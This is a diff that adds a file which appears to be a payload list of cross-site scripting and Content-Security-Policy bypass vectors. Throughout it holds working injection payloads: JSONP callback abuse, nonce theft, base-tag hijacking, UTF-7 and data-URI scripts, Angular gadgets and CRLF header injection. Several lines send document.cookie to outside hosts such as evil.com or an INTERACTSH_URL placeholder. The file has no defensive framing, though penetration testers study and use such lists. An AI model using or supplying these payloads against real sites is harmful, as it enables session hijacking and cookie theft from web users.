@@ -1,0 +1,50 @@
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://www.google-analytics.com/analytics.js?callback=alert(1)"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script nonce="STOLEN_NONCE">alert(1)</script>
+<base href="https://evil.com/">
+<script src="/static/ANGULAR_JSONP?callback=alert(1)"></script>
+<link rel="prefetch" href="https://evil.com/exfil">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>parent.alert(1)</script></svg>#x"/></svg>
+<object data="data:text/html,<script>parent.alert(1)</script>"></object>
+<iframe src="data:text/html,<script>parent.alert(1)</script>"></iframe>
+<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
+<script src="https://storage.googleapis.com/your-bucket/xss.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/evil/repo/xss.js"></script>
+<script src="https://unpkg.com/any-package@1.0.0/xss.js"></script>
+<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<script>import('data:text/javascript,alert(1)')</script>
+<script>fetch('/api/data').then(r=>r.text()).then(eval)</script>
+<script>location.hash && eval(atob(location.hash.slice(1)))</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script>angular.element(document).injector().get('$http').get('//evil.com?c='+document.cookie)</script>
+# nonce bypass via DOM clobbering
+<a id=nonce href="javascript:alert(1)">
+# strict-dynamic bypass
+<script src="https://cdn.example.com/loader.js?q=alert(1)"></script>
+# JSONP endpoints for CSP bypass
+<script src="https://api.github.com/users?callback=alert"></script>
+<script src="https://accounts.google.com/o/oauth2/v2/auth?response_type=token&callback=alert&client_id=1"></script>
+# unsafe-eval bypass
+<script>document.write(location.search.slice(1))</script>
+# CSP header injection
+%0d%0aContent-Security-Policy: script-src 'unsafe-inline'
+# Iframe bypass
+<iframe srcdoc='<script src="data:,alert(1)"></script>'></iframe>
+# object-src bypass
+<object type="text/html" data="javascript:alert(1)"></object>
+# Script gadget via angular ng-app + ng-csp
+<div ng-app ng-csp class=ng-scope><input ng-focus="$event.target.ownerDocument.defaultView.alert(1)" autofocus>
+# Exfil via link prefetch
+<link rel="prefetch" href="http://INTERACTSH_URL/?c=${document.cookie}">
+# DNS prefetch exfil
+<link rel="dns-prefetch" href="//INTERACTSH_URL">
+# Service worker registration
+<script>navigator.serviceWorker.register('/sw.js')</script>
+# Import map injection
+<script type="importmap">{"imports":{"evil":"javascript:alert(1)"}}</script>
+# Trusted types bypass
+<script>trustedTypes.createPolicy('default',{createHTML:s=>s})</script>
+# Wasm eval bypass
+<script>WebAssembly.instantiateStreaming(fetch('/wasm')).then(m=>m.instance.exports.main())</script>
